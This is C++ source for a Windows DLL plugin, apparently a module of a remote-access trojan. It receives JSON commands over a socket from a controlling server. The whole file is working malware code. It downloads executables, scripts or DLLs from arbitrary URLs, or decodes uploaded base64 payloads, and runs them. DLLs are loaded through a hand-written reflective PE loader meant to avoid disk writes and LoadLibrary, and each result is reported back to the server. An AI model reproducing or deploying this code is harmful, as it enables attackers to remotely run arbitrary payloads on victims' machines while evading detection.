#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <shellapi.h>
#include <urlmon.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <algorithm>
#include <thread>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "wininet.lib")

using json = nlohmann::json;
using namespace std;

// Base64 Decoder with Overflow Protection
vector<uint8_t> base64_decode(const string& in) {
    vector<uint8_t> out;
    vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) {
        T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;
    }
    int val = 0, valb = -8;
    for (unsigned char c : in) {
        if (T[c] == -1) continue;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            out.push_back((uint8_t)((val >> valb) & 0xFF));
            valb -= 8;
        }
        val &= 0xFFFFFF; // prevent left-shift overflow!
    }
    return out;
}

// Convert string to lower case
string toLower(string str) {
    transform(str.begin(), str.end(), str.begin(), ::tolower);
    return str;
}

// Helper to check if a string ends with a suffix
bool endsWith(const string& str, const string& suffix) {
    if (str.length() >= suffix.length()) {
        return (0 == str.compare(str.length() - suffix.length(), suffix.length(), suffix));
    }
    return false;
}

// Check if file extension is allowed
bool isAllowedExtension(const string& path) {
    size_t queryPos = path.find('?');
    string cleanPath = (queryPos != string::npos) ? path.substr(0, queryPos) : path;

    size_t dotPos = cleanPath.find_last_of('.');
    if (dotPos == string::npos) return false;

    string ext = toLower(cleanPath.substr(dotPos));
    return (ext == ".exe" || ext == ".bat" || ext == ".vbs" || ext == ".py" || ext == ".hta" || ext == ".dll");
}

// Generate file name or random
string getFileNameOrRandom(const string& url, const string& ext) {
    size_t queryPos = url.find('?');
    string cleanUrl = (queryPos != string::npos) ? url.substr(0, queryPos) : url;
    size_t slashPos = cleanUrl.find_last_of("\\/");
    if (slashPos != string::npos && slashPos + 1 < cleanUrl.length()) {
        string fname = cleanUrl.substr(slashPos + 1);
        if (isAllowedExtension(fname)) return fname;
    }
    return "temp_exec_" + to_string(GetTickCount64()) + ext;
}

// Download file into Memory
vector<uint8_t> downloadToMemory(const string& url) {
    vector<uint8_t> buffer;
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hUrl) {
            unsigned char temp[4096];
            DWORD bytesRead = 0;
            while (InternetReadFile(hUrl, temp, sizeof(temp), &bytesRead) && bytesRead > 0) {
                buffer.insert(buffer.end(), temp, temp + bytesRead);
            }
            InternetCloseHandle(hUrl);
        }
        InternetCloseHandle(hInternet);
    }
    return buffer;
}

// Custom PE Reflective Manual Mapper (No disk writing, no LoadLibrary)
HMODULE reflectiveLoadDLL(const vector<uint8_t>& dllBytes) {
    unsigned char* pSrc = const_cast<unsigned char*>(dllBytes.data());

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrc;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrc + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;

    // Allocate memory for the image
    unsigned char* pBase = (unsigned char*)VirtualAlloc(NULL, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pBase) return NULL;

    // Copy headers
    memcpy(pBase, pSrc, pNtHeaders->OptionalHeader.SizeOfHeaders);

    // Copy sections
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (pSectionHeader[i].SizeOfRawData > 0) {
            memcpy(pBase + pSectionHeader[i].VirtualAddress, pSrc + pSectionHeader[i].PointerToRawData, pSectionHeader[i].SizeOfRawData);
        }
    }

    // Base relocations
    IMAGE_DATA_DIRECTORY relocDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocDir.Size > 0) {
        PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pBase + relocDir.VirtualAddress);
        uintptr_t delta = (uintptr_t)(pBase - pNtHeaders->OptionalHeader.ImageBase);
        while (pReloc->VirtualAddress != 0) {
            DWORD size = pReloc->SizeOfBlock;
            DWORD count = (size - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            USHORT* pList = (USHORT*)((unsigned char*)pReloc + sizeof(IMAGE_BASE_RELOCATION));
            for (DWORD i = 0; i < count; i++) {
                USHORT type = pList[i] >> 12;
                USHORT offset = pList[i] & 0x0FFF;
                if (type == IMAGE_REL_BASED_HIGHLOW || type == IMAGE_REL_BASED_DIR64) {
                    uintptr_t* pAddress = (uintptr_t*)(pBase + pReloc->VirtualAddress + offset);
                    *pAddress += delta;
                }
            }
            pReloc = (PIMAGE_BASE_RELOCATION)((unsigned char*)pReloc + size);
        }
    }

    // Import directory
    IMAGE_DATA_DIRECTORY importDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pBase + importDir.VirtualAddress);
        while (pImportDesc->Name != 0) {
            char* pDllName = (char*)(pBase + pImportDesc->Name);
            HMODULE hDll = LoadLibraryA(pDllName);
            if (!hDll) return NULL;

            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(pBase + pImportDesc->FirstThunk);
            PIMAGE_THUNK_DATA pOriginalThunk = pThunk;
            if (pImportDesc->OriginalFirstThunk != 0) {
                pOriginalThunk = (PIMAGE_THUNK_DATA)(pBase + pImportDesc->OriginalFirstThunk);
            }

            while (pOriginalThunk->u1.AddressOfData != 0) {
                FARPROC pFunc = NULL;
                if (IMAGE_SNAP_BY_ORDINAL(pOriginalThunk->u1.Ordinal)) {
                    pFunc = GetProcAddress(hDll, (LPCSTR)IMAGE_ORDINAL(pOriginalThunk->u1.Ordinal));
                } else {
                    PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)(pBase + pOriginalThunk->u1.AddressOfData);
                    pFunc = GetProcAddress(hDll, (LPCSTR)pImportByName->Name);
                }

                if (!pFunc) return NULL;

                pThunk->u1.Function = (uintptr_t)pFunc;

                pThunk++;
                pOriginalThunk++;
            }
            pImportDesc++;
        }
    }

    // Call DllMain
    typedef BOOL(WINAPI* LPDLLMAIN)(HINSTANCE, DWORD, LPVOID);
    if (pNtHeaders->OptionalHeader.AddressOfEntryPoint != 0) {
        LPDLLMAIN pDllMain = (LPDLLMAIN)(pBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
        pDllMain((HINSTANCE)pBase, DLL_PROCESS_ATTACH, NULL);
    }

    return (HMODULE)pBase;
}

// Resolve export from manual mapped module
FARPROC resolveExport(HMODULE hMod, const char* name) {
    unsigned char* pBase = (unsigned char*)hMod;
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pBase + pDosHeader->e_lfanew);

    IMAGE_DATA_DIRECTORY exportDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.Size == 0) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pBase + exportDir.VirtualAddress);
    DWORD* pNames = (DWORD*)(pBase + pExport->AddressOfNames);
    DWORD* pFuncs = (DWORD*)(pBase + pExport->AddressOfFunctions);
    USHORT* pOrdinals = (USHORT*)(pBase + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        char* pName = (char*)(pBase + pNames[i]);
        if (strcmp(pName, name) == 0) {
            DWORD funcRVA = pFuncs[pOrdinals[i]];
            return (FARPROC)(pBase + funcRVA);
        }
    }
    return NULL;
}

// Send response JSON to Server
void sendResponse(SOCKET sock, const string& status, const string& message) {
    json j;
    j["action"] = "remote_execute_response";
    j["status"] = status;
    j["message"] = message;
    string msg = j.dump() + "\r\n";
    send(sock, msg.c_str(), (int)msg.length(), 0);
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    // Standard signature, not used directly but required for consistency
    sendResponse(sock, "error", "Plugin entry point not implemented for RunPlugin. Use HandleCommand.");
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    try {
        auto data = json::parse(commandJson);
        string action = data.value("action", "");

        if (action == "remote_execute_url") {
            string url = data.value("url", "");
            if (url.empty()) {
                sendResponse(sock, "error", "URL is empty");
                return;
            }

            if (!isAllowedExtension(url)) {
                sendResponse(sock, "error", "Unsupported file extension in URL. Only .exe, .bat, .vbs, .py, .hta, and .dll are allowed.");
                return;
            }

            // Execute file or reflective DLL load
            if (endsWith(toLower(url), ".dll")) {
                SOCKET currentSock = sock;
                string currentUrl = url;
                thread([currentUrl, currentSock]() {
                    vector<uint8_t> downloadedBytes = downloadToMemory(currentUrl);
                    if (downloadedBytes.empty()) {
                        sendResponse(currentSock, "error", "Failed to download remote DLL into memory");
                        return;
                    }

                    HMODULE hMod = reflectiveLoadDLL(downloadedBytes);
                    if (hMod) {
                        typedef void (*PluginEntry)(SOCKET);
                        PluginEntry func = (PluginEntry)resolveExport(hMod, "RunPlugin");
                        if (func) {
                            try { func(currentSock); } catch (...) {}
                            sendResponse(currentSock, "success", "Successfully downloaded, reflectively loaded DLL in-memory, and executed RunPlugin.");
                        } else {
                            sendResponse(currentSock, "success", "Successfully downloaded and reflectively loaded DLL in-memory (no RunPlugin export found).");
                        }
                    } else {
                        sendResponse(currentSock, "error", "Failed to reflectively load downloaded DLL from memory");
                    }
                }).detach();
                return;
            }

            char tempDir[MAX_PATH];
            if (GetTempPathA(MAX_PATH, tempDir) == 0) {
                sendResponse(sock, "error", "Failed to get temp path");
                return;
            }

            string ext;
            size_t dotPos = url.find('?');
            string cleanUrl = (dotPos != string::npos) ? url.substr(0, dotPos) : url;
            size_t lastDot = cleanUrl.find_last_of('.');
            if (lastDot != string::npos) {
                ext = toLower(cleanUrl.substr(lastDot));
            }

            string destFile = string(tempDir) + getFileNameOrRandom(url, ext);

            // Download file
            HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), destFile.c_str(), 0, NULL);
            if (FAILED(hr)) {
                sendResponse(sock, "error", "Failed to download remote file (HRESULT: " + to_string(hr) + ")");
                return;
            }

            HINSTANCE hInst = ShellExecuteA(NULL, "open", destFile.c_str(), NULL, NULL, SW_SHOW);
            if ((uintptr_t)hInst <= 32) {
                sendResponse(sock, "error", "Failed to execute downloaded file (" + destFile + "). Error code: " + to_string((uintptr_t)hInst));
            } else {
                sendResponse(sock, "success", "Successfully downloaded and executed: " + destFile);
            }
        }
        else if (action == "remote_execute_local") {
            string filename = data.value("filename", "");
            string content64 = data.value("content", "");

            if (filename.empty() || content64.empty()) {
                sendResponse(sock, "error", "Filename or content is empty");
                return;
            }

            if (!isAllowedExtension(filename)) {
                sendResponse(sock, "error", "Unsupported file extension. Only .exe, .bat, .vbs, .py, .hta, and .dll are allowed.");
                return;
            }

            vector<uint8_t> decodedBytes = base64_decode(content64);

            // Execute DLL reflectively (No disk write, no LoadLibrary)
            if (endsWith(toLower(filename), ".dll")) {
                SOCKET currentSock = sock;
                thread([decodedBytes, currentSock]() {
                    HMODULE hMod = reflectiveLoadDLL(decodedBytes);
                    if (hMod) {
                        typedef void (*PluginEntry)(SOCKET);
                        PluginEntry func = (PluginEntry)resolveExport(hMod, "RunPlugin");
                        if (func) {
                            try { func(currentSock); } catch (...) {}
                            sendResponse(currentSock, "success", "Successfully reflectively loaded DLL in-memory and executed RunPlugin.");
                        } else {
                            sendResponse(currentSock, "success", "Successfully reflectively loaded DLL in-memory (no RunPlugin export found).");
                        }
                    } else {
                        sendResponse(currentSock, "error", "Failed to reflectively load DLL from memory");
                    }
                }).detach();
                return;
            }

            char tempDir[MAX_PATH];
            if (GetTempPathA(MAX_PATH, tempDir) == 0) {
                sendResponse(sock, "error", "Failed to get temp path");
                return;
            }

            string destFile = string(tempDir) + filename;
            ofstream ofs(destFile, ios::binary);
            if (!ofs.is_open()) {
                sendResponse(sock, "error", "Failed to create local file in temp folder: " + destFile);
                return;
            }

            ofs.write((const char*)decodedBytes.data(), decodedBytes.size());
            ofs.close();

            HINSTANCE hInst = ShellExecuteA(NULL, "open", destFile.c_str(), NULL, NULL, SW_SHOW);
            if ((uintptr_t)hInst <= 32) {
                sendResponse(sock, "error", "Failed to execute file (" + destFile + "). Error code: " + to_string((uintptr_t)hInst));
            } else {
                sendResponse(sock, "success", "Successfully uploaded and executed: " + destFile);
            }
        }
        else {
            sendResponse(sock, "error", "Unknown remote execution action: " + action);
        }
    }
    catch (const exception& e) {
        sendResponse(sock, "error", "Exception in HandleCommand: " + string(e.what()));
    }
    catch (...) {
        sendResponse(sock, "error", "Unknown exception in HandleCommand");
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}